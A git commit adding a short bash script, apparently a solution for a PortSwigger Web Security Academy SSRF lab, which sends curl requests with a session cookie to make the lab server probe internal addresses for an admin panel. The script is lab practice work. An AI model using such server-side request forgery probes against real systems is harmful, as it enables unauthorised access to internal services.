e5a0bc778e841ecdf8c2eef988e943ead2a70c29
micheal keines <micheal.jebakeines@cybersecurityworks.com>
2021-02-23 08:25:39 -0500

    done

---
+++ portswigger/labs/ssrf/get.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+
+curl -d "stockApi=http://192.168.0.$1:8080/admin" -H "Cookie: session=yd2yVBHTvAXJkUwZ1vRd1UlRI58Eb2z5" https://ac991f6c1e422fc38069249f003600e6.web-security-academy.net/product/stock
+
